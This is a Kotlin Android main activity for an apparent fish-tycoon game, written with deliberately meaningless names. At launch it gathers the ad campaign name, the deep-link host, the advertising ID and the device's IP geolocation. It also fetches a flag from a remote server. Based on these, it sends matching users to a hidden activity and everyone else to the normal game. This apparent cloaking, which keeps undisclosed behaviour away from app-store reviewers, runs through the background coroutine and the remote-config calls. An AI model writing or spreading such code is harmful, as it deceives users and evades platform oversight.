package com.ldw.fishtycoon

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.ldw.fishtycoon.databinding.ActivityMainBinding
import com.ldw.fishtycoon.fewdw.Lopsijdw
import com.ldw.fishtycoon.jhgf.Kiusdja
import com.ldw.fishtycoon.fewdw.Kiswwudws.Companion.xcoxczs
import com.ldw.fishtycoon.fewdw.Kiswwudws.Companion.jidsidusduhsd
import com.ldw.fishtycoon.fewdw.Kiswwudws.Companion.xoskdokwopdl
import com.ldw.fishtycoon.fewdw.Kiswwudws.Companion.vobvijvbuhvkofkd
import com.ldw.fishtycoon.fewdw.Kiswwudws.Companion.qpwoksdsijad
import com.ldw.fishtycoon.resdsa.Jusidhuwu
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    lateinit var jxcxzuczxhu: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        jxcxzuczxhu = ActivityMainBinding.inflate(layoutInflater)
        setContentView(jxcxzuczxhu.root)

        odkokasdosdi(this)
        GlobalScope.launch(Dispatchers.IO) {
            woksdoks
        }

        AppsFlyerLib.getInstance()
            .init("Ps5BJF8zC48xETc6jQWzFU", sadjiasdji, applicationContext)
        AppsFlyerLib.getInstance().start(this)

    }




    private val sadjiasdji = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(cixjzij: MutableMap<String, Any>?) {
            val dijasji = cixjzij?.get("campaign").toString()
            Hawk.put(xcoxczs, dijasji)
        }

        override fun onConversionDataFail(p0: String?) {
            Log.e("wdedw", "error getting conversion data: $p0" );
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }



    private fun ooksijd(){
        val ciojxcv = AdvertisingIdClient(applicationContext)
        ciojxcv.start()
        val wokdkso = ciojxcv.info.id
        Log.d("csac = ", wokdkso.toString())
        Hawk.put(qpwoksdsijad, wokdkso)
    }

    private suspend fun eiojsadjidoask(): String? {
        val xicj = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://prodigiousprod.live/")
            .build()
            .create(Kiusdja::class.java)

        val sdijas = xicj.odkfsdkods().body()?.dfok
        Log.d("czxcz", "sadw: $sdijas")
        val vokckoovcji = xicj.odkfsdkods().body()?.xokckzox
        Hawk.put(xoskdokwopdl, vokckoovcji)
        Hawk.put(jidsidusduhsd, sdijas)
        Log.d("xsdsad", "sdaswd: ${Hawk.get(jidsidusduhsd, "null")}")
        Log.d("wqwdwwq", "dfsdd: ${Hawk.get(xoskdokwopdl, "null")}")
        val xokcokcxzko = xicj.odkfsdkods().body()?.eokosdakod
        Log.d("jghhtrh", xokcokcxzko.toString())
        return xokcokcxzko
    }

    private val woksdoks: Job = GlobalScope.launch(Dispatchers.IO) {
        val cxokvxcov: String = difjsjid().toString()
        val psadaodsk = eiojsadjidoask().toString()
        val xicjz: String? = Hawk.get(vobvijvbuhvkofkd, "null") //здесь нужен дефолтный ноль
        val woksdko = Hawk.get(xoskdokwopdl, "null")
        var pldssodkkoasd: String? = Hawk.get(xcoxczs)
        ooksijd()
        if (woksdko == "1") {
            val xuczhhuzxc = Executors.newSingleThreadScheduledExecutor()
            xuczhhuzxc.scheduleAtFixedRate({
                if (pldssodkkoasd != null) {
                    Log.d("DFEsd", pldssodkkoasd.toString())

                    if (pldssodkkoasd!!.contains("tdb2") || psadaodsk.contains(cxokvxcov) || xicjz!!.contains("tdb2")) {
                        Log.d("czxcsds", "dwdw: $pldssodkkoasd")
                        xuczhhuzxc.shutdown()
                        startActivity(Intent(this@MainActivity, Lopsijdw::class.java))
                        finish()
                    } else {
                        xuczhhuzxc.shutdown()
                        startActivity(Intent(this@MainActivity, Jusidhuwu::class.java))
                        finish()
                    }
                } else {
                    pldssodkkoasd = Hawk.get(xcoxczs)
                    Log.d("jhgn", "Received null $pldssodkkoasd")
                }

            }, 0, 2, TimeUnit.SECONDS)
        }
        else if (psadaodsk.contains(cxokvxcov)) {
            startActivity(Intent(this@MainActivity, Lopsijdw::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, Jusidhuwu::class.java))
            finish()
        }
    }
    fun odkokasdosdi(covkkxv: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            covkkxv
        ) { eokoskadk: AppLinkData? ->
            eokoskadk?.let {
                val xzicjzixcj = eokoskadk.targetUri.host.toString()
                Hawk.put(vobvijvbuhvkofkd, xzicjzixcj)
            }
            if (eokoskadk == null) {

            }
        }
    }



    private suspend fun difjsjid(): String? {
        val civjxci = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(Kiusdja::class.java)

        val aoassa = civjxci.zozxkokz().body()?.epsdlasd
        Log.d("dfsfe", "hjy: $aoassa ")
        return aoassa

    }


}